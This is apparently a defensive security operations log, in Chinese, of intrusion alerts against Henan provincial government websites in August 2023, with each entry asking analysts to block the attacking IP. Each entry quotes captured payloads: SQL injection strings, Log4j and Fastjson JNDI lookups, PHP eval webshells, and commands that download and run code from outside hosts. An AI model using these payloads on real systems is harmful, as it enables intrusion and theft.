# 2023.08.09 周三晚



## 01

@正数-安全监测组-李祥州 请分析研判
受害系统：生育登记和再生育审批服务平台06和非税网上交款
告警来源：态势感知系统
告警详情：
韩国首尔IP：158.247.232.182，针对生育登记和再生育审批服务平台06和非税网上交款进行
sql注入攻击，共计7次；经分析存在"FLOW_ID=11' and (SELECT 1 from (select count(*),concat(floor(rand(0)*2),user(),255*255,(substring((select md5(255*255)),1,62)))a from information_schema.tables group by a)b)#"等恶意攻击参数，请协调封堵该IP地址。



## 02

@正数-安全监测组-李祥州 请分析研判
受害系统：义务教育招生152
告警来源：态势感知系统
告警详情：
埃及 亚历山大省IP：156.194.101.232，针对义务教育招生152进行远程代码执行攻击，共计3次；经分析存在"shell?cd /tmp;rm -rf *;wget 37.139.129.190/jaws;sh /tmp/jaws"恶意攻击参数，请协调封堵该IP地址。

## 03

@正数-安全监测组-李祥州 请分析研判
受害系统：省人社厅_人才市场公共服务平台01
告警来源：态势感知系统
告警详情：
中国 中国香港IP：27.124.10.187,针对省人社厅_人才市场公共服务平台01进行命令执行攻击，共计40次；经分析存在"spread=@eval/*....!..s ................*/.(${'_P'.'OST'}[z9]/*...?...?...? ...*/.(${'_POS'.'T'}"等恶意攻击参数，请协调封堵该IP地址。

## 04

@正数-安全监测组-李祥州 请分析研判
受害系统：非税网上交款
告警来源：态势感知系统
告警详情：
荷兰 阿姆斯特丹IP：79.137.196.27, 针对非税网上交款进行远程代码命令执行攻击，共计76次；经分析存在"cmd.exe /c @echo Set objXMLHTTP=CreateObject(&quot;MSXML2.XMLHTTP&quot;)&gt;deliver.vbs&amp;@echo objXMLHTTP.open &quot;GET&quot;,&quot;http://87.121.221.176/deliver.exe&quot;,false&gt;&gt;deliver.vbs&amp;@echo objXMLHTTP.send()&gt;&gt;deliver.vbs&amp"等恶意攻击参数，请协调封堵该IP地址。

## 05

@正数-安全监测组-李祥州 请分析研判
受害系统：焦作地市纪委网站群80
告警来源：态势感知系统
告警详情：
焦作市IP：42.238.245.49,针对焦作地市纪委网站群80进行sql注入攻击，共计811次；经分析存在cookie="SERVERID=f99cc712b02067f38097ba3c3661240a|1691587146|1691587146' AND ROW(4341,4342)&gt;(SELECT COUNT(*),CONCAT('l7QIAUbp',(SELECT (CASE WHEN (4341=4341) THEN 1 ELSE 0 END)),'l7QIAUbp',FLOOR(RAND(0)*2))x FROM (SELECT 4343 UNION SELECT 4344 UNION SELECT 4345 UNION SELECT 4346)a GROUP BY x) AND 'l7QIAUbp'='l7QIAUbp等恶意攻击参数，请协调封堵该IP地址。



## 06

@正数-安全监测组-李祥州 请分析研判
受害系统：省水路网运行监测系统04
告警来源：态势感知系统
告警详情：
北京IP：47.92.85.55，针对省水路网运行监测系统04进行命令执行、sql注入、文件包含等攻击，共计21674次；经分析存在 parameter="title=||cat /etc/passwd"，="AnD 1=2 OR pg_sLeEp(15) And "="&amp等恶意攻击参数，请协调封堵该IP地址。



## 07

@正数-安全研判组-李祥州 请分析研判
受害系统：政务服务平台门户_n_1
告警来源：态势感知系统
告警详情：
中国香港IP：103.73.160.138，针对政务服务平台门户_n_1进行PHP注入攻击，共计21次；经分析存在 "http://hbsc.hnzwfw.gov.cn/index.php/Index/index/name/${@eval($_POST[c])}"恶意攻击参数，请协调封堵该IP地址。



## 08

@正数-安全研判组-李祥州 请分析研判
受害系统：地市纪委网站群80
告警来源：态势感知系统
告警详情：
郑州市IP：123.161.218.60，针对地市纪委网站群80进行文件上传攻击，共计634次；经分析存在
["/var/www/html/d.txt;echo '<?php echo md5(azxznudxhx);unlink(__FILE__);?>' &gt;/var/www/html/azxznudxhx.php"]}]恶意攻击参数，请协调封堵该IP地址。



## 09

@正数-安全研判组-李祥州 请分析研判
受害系统：省人大代表综合履职平台系统01
告警来源：态势感知系统
告警详情：
广州市IP：112.33.15.89，针对省人大代表综合履职平台系统01进行漏洞扫描、sql注入攻击，共计66次；经分析存在
"url": "http://www.zmdrd.gov.cn/2017/soPCHLOg'; waitfor delay '0:0:12' -- -31/35424.html"等恶意攻击参数，请协调封堵该IP地址。



## 10

@安全处置-王鹏帅 经分析研判发现
受害系统：总部
告警来源：态势感知系统
告警详情：
中国香港IP：112.213.116.174，针对总部进行弱口令利用；经分析存在
"parameter="enews=login&eposttime=0&username=henanpeace321&password=admin888" “parameter="enews=login&eposttime=0&username=henanpeace321&password=admin123””parameter="enews=login&eposttime=0&username=henanpeace666&password=654321“等恶意攻击参数，请封堵中国香港IP：112.213.116.174。



## 11

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02和默认租户总部
告警来源：态势感知系统
告警详情：
北京市IP：39.106.90.28，针对省预约平台02和默认租户总部进行tomcat暴力破解攻击，共计120次；经分析存在"admin:hnskfyy168、admin:Hnjky"等账号口令进行暴力破解攻击，请协调封堵该IP地址。



## 12

@正数-安全研判组-李祥州 请分析研判
受害系统：总部
告警来源：态势感知系统
告警详情：
韩国IP：61.75.17.124，针对总部进行sql注入攻击，共计2次；经分析存在"http_request_body_printable": "account=admin'+and++updatexml(1,concat(0x1,md5(999999999)),1)+and+'1'='1"恶意参数进行sql注入攻击，请协调封堵该IP地址。

## 13

@正数-安全研判组-李祥州 请分析研判
受害系统：生卫计委_卫计委省直单位财务报表平台06
告警来源：态势感知系统
告警详情：
杭州市IP：47.98.181.111，针对生卫计委_卫计委省直单位财务报表平台06进行利用Fastjson反序列化漏洞攻击，共计13次；经分析存在{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://9rna4m8u.dahepai.com:1399/s0evy0","loginTimeout":0}}"恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。

## 14

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02
告警来源：态势感知系统
告警详情：
北京市IP：39.107.101.212，针对省预约平台02进行tomcat暴力破解攻击，共计136次；经分析存在"admin:Gjjyyxw@123、admin:Gjjyyxw123.com、admin:Hnxyzx"等账号口令进行暴力破解攻击，请协调封堵该IP地址。

## 15

@正数-安全研判组-李祥州 请分析研判
受害系统：生卫计委_卫计委省直单位财务报表平台06
告警来源：态势感知系统
告警详情：
北京市IP：39.105.3.82，针对生卫计委_卫计委省直单位财务报表平台06进行利用Fastjson反序列化漏洞攻击，共计16次；经分析存在{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://tqzd3yzx.dahepai.com:1399/zfa4qq","loginTimeout":0}}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。



## 16

@正数-安全研判组-李祥州 请分析研判
受害系统：河南省卫计委省直单位财务报表平台05
告警来源：态势感知系统
告警详情：
北京市IP：47.95.8.238，针对河南省卫计委省直单位财务报表平台05进行利用Fastjson反序列化漏洞攻击，共计10次；经分析存在{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://zyuw8gkr.dahepai.com:1399/rc17su","autoCommit":true}}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。



## 17

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02
告警来源：态势感知系统
告警详情：
杭州市IP：47.96.233.182，针对省预约平台02进行利用Fastjson反序列化漏洞攻击，共计17次；经分析存在{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://0mue2hct.dahepai.com:1399/cd5srt","loginTimeout":0}}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。

## 18

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02
告警来源：态势感知系统
告警详情：
北京市IP：101.200.40.203，针对省预约平台02进行利用Fastjson反序列化漏洞攻击，共计17次；经分析存在{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["ldap://a2chji1d.dahepai.com:1399/m0qr8p"]}}}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。

## 19

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02和河南省卫计委门户网站03
告警来源：态势感知系统
告警详情：
北京市IP：39.105.97.151、39.106.153.182、47.94.248.222、47.94.244.125、47.95.194.136，杭州IP：116.62.125.36、47.98.53.185，针对省预约平台02和河南省卫计委门户网站03进行利用Fastjson反序列化漏洞攻击和暴力爆破攻击，共计74次；经分析存在{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["ldap://xsgqdjxn.dahepai.com:1399/u8nag6"]}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。



## 20

@正数-安全研判组-李祥州 请分析研判
受害系统：总部
告警来源：态势感知系统
告警详情：
济南市IP：112.224.163.207，针对总部进行利用Apache Log4j代码执行攻击，共计44次；经分析存在=${:-y$}{${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://log4222.143.1691614333935.bNJE.yncbm7.ceye.io/a}恶意参数进行Apache Log4j代码执行攻击，请协调封堵该IP地址。



## 21

@正数-安全研判组-李祥州 请分析研判
受害系统：省预约平台02
告警来源：态势感知系统
告警详情：
北京市IP：39.106.15.250，针对省预约平台02进行利用Fastjson反序列化漏洞攻击和暴力爆破攻击，共计16次；经分析存在{"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources":["ldap://xsgqdjxn.dahepai.com:1399/u8nag6"]}恶意参数进行Fastjson反序列化漏洞攻击，请协调封堵该IP地址。



## 22

@正数-安全研判组-李祥州 请分析研判
受害系统：教育资源公共服务平台
告警来源：态势感知系统
告警详情：
上海市IP：123.207.204.182，针对教育资源公共服务平台进行SSH暴力破解攻击，共计168次；经分析存在SSH暴力破解攻击，请协调封堵该IP地址。



## 23

@正数-安全研判组-李祥州 请分析研判
受害系统：地市纪委网站群80_3和政府采购网上商城系统19
告警来源：态势感知系统
告警详情：
美国洛杉矶IP：45.86.68.201，针对地市纪委网站群80_3和政府采购网上商城系统19，进行SQL注入攻击、文件上传攻击，共计628次，经分析存在parameter="type=image&amp;field_id=image&amp;tag=image&amp;from=image&amp;search=image&amp;options=["test') or 1=1 -- "]"恶意参数，进行SQL注入攻击、文件上传攻击，请协调封堵该IP地址。





# 2023.08.15 周二晚

## 01

请分析研判
受害系统：健教所_省健康促进和教育融
告警来源：态势感知系统
告警详情：
安徽 黄山市IP：114.104.134.229，针对健教所_省健康促进和教育融进行远程命令/代码执行等攻击，共计10次；经分析存在parameter="document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl http://cjdlub1953p321g0001051e1tuoqqms1n.oast.pro")"等恶意参数，请协调封堵该IP地址。



## 02

请分析研判
受害系统：健教所_省健康促进和教育融
告警来源：态势感知系统
告警详情：
重庆市 14.106.241.92,营口市 113.237.6.13,马鞍山市 114.102.33.226,天津市 42.81.132.188,锦州市 42.56.239.184,黄山市 183.166.170.82、27.158.48.20,常州市 222.185.19.203,蚌埠市 117.60.0.169,漳州市 27.158.197.15、27.158.197.157，针对健教所_省健康促进和教育融进行远程命令/代码执行等攻击，共计100次；经分析存在uri="/jexws4/jexws4.jsp?ppp=cat /etc/passwd"和uri="/dr/authentication/oauth2/oauth2login?error=${jndi:ldap://${hostName}.cjdlvsp953p8olg00010dbtgx8baueb4m.oast.live}"以及process.mainModule.require('child_process').execSync('wget http://cjdlvgh953p4a8o00010ukbta7bczs18z.oast.site')等恶意参数，请协调封堵该IP地址。



## 03

@正数-安全研判组-李祥州 请分析研判
受害系统：省住房建设厅05
告警来源：态势感知系统
告警详情：
浙江 IP：111.55.140.39，针对省住房建设厅05进行远程命令/代码执行等攻击，共计31次；经分析存在req_body="bsh.script=exec("whoami")、COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2'AnD (SeLeCt 1 FrOm (SeLeCt CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x FrOm InFoRmAtIoN_ScHeMa.TaBlEs GrOuP By x)a)等恶意参数，请协调封堵该IP地址。



## 04

@正数-安全研判组-李祥州 请分析研判
受害系统：教育资源公共服务平台_50
告警来源：态势感知系统
告警详情：
中国 上海市IP：27.109.126.83，针对教育资源公共服务平台_50进行木马程序攻击，共计3次；经分析存在Execute(\"Execute(\"\":Functionbd(byVals):Fori=1ToLen(s)Step2:c=Mid(s,i,2):IfIsNumeric(Mid(s,i,1))Then:Execute()等恶意参数，请协调封堵该IP地址。

## 05

请分析研判
受害系统：总部
告警来源：态势感知系统
告警详情：
天津市IP：123.150.77.253，针对总部进行log4j命令执行攻击，共计207次；经分析存在X-Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://cjdqorsahf3ud4a0u2p0fokzw6srpajxh.oast.fun/poc}等恶意参数，请协调封堵该IP地址。

## 06

@正数-安全研判组-李祥州 请分析研判
受害系统：省公共资源交易中心_
告警来源：态势感知系统
告警详情：
中国 北京市IP：123.57.86.213、112.126.80.231、123.56.145.73、112.126.68.217、123.56.232.204，针对省公共资源交易中心_进行log4j命令执行攻击，共计2026次；经分析存在Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}和${lower:r}m${lower:i}}://cjdse2cahf3pdaeka1kgqe7o3emnre8ag.oast.fun/poc}等恶意参数，请协调封堵该IP地址。

## 07

@正数-安全研判组-李祥州 请分析研判
受害系统：省人大代表综合履职平台系统01
告警来源：态势感知系统
告警详情：
中国 青岛市IP：119.167.238.202，针对省人大代表综合履职平台系统01进行代码执行攻击，共计17次；经分析存在java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\"))等恶意参数，请协调封堵该IP地址。

## 08

@正数-安全研判组-李祥州 请分析研判
受害系统：教育资源公共服务平台_50
告警来源：态势感知系统
告警详情：
中国 北京市IP：123.125.34.24、123.125.34.25、123.103.125.53、123.125.10.22，针对教育资源公共服务平台_50进行代码执行攻击，共计265次；经分析存在user=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2等恶意参数，请协调封堵该IP地址。

## 09

@正数-安全研判组-李祥州 请分析研判
受害系统：人社厅网站
告警来源：态势感知系统
告警详情：
中国 铜陵市 114.99.5.137，中国 漳州市 220.161.32.20，中国 合肥 223.240.222.136，针对人社厅网站进行远程命令/代码执行，共计35次；经分析存在uri="/jbossass/jbossass.jsp?ppp=type C:/Windows/win.ini"等恶意参数，请协调封堵该IP地址。

## 10

请分析研判
受害系统：教育资源公共服务平台_50
告警来源：态势感知系统
告警详情：
中国 福州市 27.148.140.233，中国 北京市 123.103.125.177、123.103.125.33、123.103.125.45，中国 上海市 27.109.126.71，针对教育资源公共服务平台_50IP：172.24.1.52，进行远程命令/代码执行，共计213次；经分析存在dataSourceName:"rmi://cjduijcahf3mbsflrga0t6wn43wa16986.oast.pro/Exploit"等恶意参数，请协调封堵该IP地址。



# 2023.08.18 周五白

## 01

请分析研判
受害系统：教育资源公共服务平台_50
告警来源：态势感知系统
告警详情：
中国 焦作市IP：182.120.98.123，针对党员管理信息化工程应用系统IP：172.24.2.244，进行远程命令/代码执行、文件包含、文件读取、文件上传等攻击，共计559次；经分析存在uri="/scripts/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd"以及“63:"eval(base64_decode($_POST[123456]));JFactory::getConfig();exit;”和“agent="() { :; }; echo; echo test for CVE-$((2000+14))-6271;" 等恶意参数，请协调封堵该IP地址。

## 02

@正数-安全监测组-李祥州 请分析研判
受害系统：总部
告警来源：态势感知系统
告警详情：
中国 上海市 IP：101.89.239.122，针对总部IP：172.24.196.132，进行命令执行攻击，共计57次；经分析存在 parameter="base64Url=`echo puvybhon > zckr.txt`&format=png"等恶意参数，请协调封堵该IP地址。

## 03

请分析研判
受害系统：诉讼服务平台项目1
告警来源：态势感知系统
告警详情：
中国 成都市IP：112.44.203.234，针对诉讼服务平台项目1IP：172.24.2.197，进行sql注入攻击，共计24次；经分析存在"url": "http://ssfw.hncourt.gov.cn/2yg9Idi2' OR 522=(SELECT 522 FROM PG_SLEEP(15))--/My97DatePicker/calendar.js" 等恶意参数，请协调封堵该IP地址。



# 2023.08.21 周一晚

## 01

请分析研判
受害系统：地市纪委网站群80_3
告警来源：态势感知系统
告警详情：
中国香港IP：119.42.149.122，针对地市纪委网站群80_3IP：172.24.0.255，进行thinkphp远程代码执行攻击，共计5次；经分析存在_method=__construct&method&filter[]=var_dump 等恶意参数，请协调封堵该IP地址。

## 02

请分析研判
受害系统：总部
告警来源：态势感知系统
告警详情：
伊朗 德黑兰IP：193.151.137.17，针对总部IP：172.24.6.115，进行远程命令执行攻击，共计2次；经分析存在uri="/infusions/downloads/downloads.php?cat_id=${system(ls)}" agent="Custom-AsyncHttpClient" parameter="cat_id=${system(ls)}"等恶意参数，请协调封堵该IP地址。



## 03

请分析研判
受害系统：诉讼服务平台项目1
告警来源：态势感知系统
告警详情：
中国 三门峡市IP：106.42.98.184，针对诉讼服务平台项目1IP：172.24.2.197，进行远程命令执行攻击，共计36次；经分析存在method="GET" host="222.143.21.165" uri="/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?>"等恶意参数，请协调封堵该IP地址。





